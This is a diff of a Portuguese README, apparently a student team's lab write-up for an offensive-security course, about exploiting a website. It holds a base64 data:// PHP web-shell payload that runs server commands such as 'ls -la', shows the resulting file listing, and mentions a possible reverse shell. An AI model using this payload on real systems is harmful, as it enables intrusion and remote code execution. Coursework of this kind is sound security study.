@@ -1,4 +1,4 @@
-# 🔍 Exploração do Site — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡
+<img width="409" height="403" alt="image" src="https://github.com/user-attachments/assets/b2a400c9-cb9c-4935-be6c-0520f8b8f178" /># 🔍 Exploração do Site — 👨‍🔬 Penetratium ☢️ - 🧬 Team 📡
 
 ## 🔗 Materia Segurança Ofensiva 📕
 
@@ -94,32 +94,38 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
 
 ---
 
-### ▶️ Executando `ls`
+### ▶️ Executando `ls -la`
 ```
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la
 
-    
-        BANCO DE DADOS
-    adminhelp
-    backup.php
-    css
-    font-awesome
-    fonts
-    header.php
-    home.php
-    images
-    img
-    index.php
-    js
-    login.php
-    prog
-    robots.txt
-    submit.php
-    uploads
-    webdata
+
+            total 84
+    drwxr-xr-x 12 www-data www-data 4096 Sep 18 22:39 .
+    drwxr-xr-x  3 root     root     4096 Sep 18 11:04 ..
+    -rw-r--r--  1 root     root      165 Sep 18 22:26 .htaccess
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:03 BANCO DE DADOS
+    drwxr-xr-x  2 root     root     4096 Sep 18 22:47 adminhelp
+    -rw-r--r--  1 root     root      101 Sep 18 22:43 backup.php
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:03 css
+    drwxr-xr-x  6 www-data www-data 4096 Sep 18 11:03 font-awesome
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:03 fonts
+    -rw-r--r--  1 www-data www-data 1559 Sep 18 15:19 header.php
+    -rw-r--r--  1 www-data www-data 1274 Sep 18 15:05 home.php
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:03 images
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 13:17 img
+    -rw-r--r--  1 www-data www-data 3242 Sep 18 14:57 index.php
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:03 js
+    -rw-r--r--  1 www-data www-data  995 Sep 18 11:03 login.php
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 11:30 prog
+    -rw-r--r--  1 root     root       26 Sep 18 22:07 robots.txt
+    -rw-r--r--  1 www-data www-data 1723 Sep 18 15:07 submit.php
+    drwxr-xr-x  2 www-data www-data 4096 Sep 18 16:16 uploads
+    -rw-r--r--  1 root     root      105 Sep 18 22:45 webdata
     )�
+
         
 ```
+
 
 ---
 
@@ -130,4 +136,5 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls
 - ✔️ Apesar de não exibir diretamente no navegador, os comandos executados podem ser verificados no **código-fonte via DevTools**.
 - ✔️ Acesso ao Banco de Dados e possivel shell reversa.
 
+- dica : Quando for usar 'backspace' use %20 ; não use + .
 - ⚡ Essa análise confirma o risco de exposição crítica do sistema.
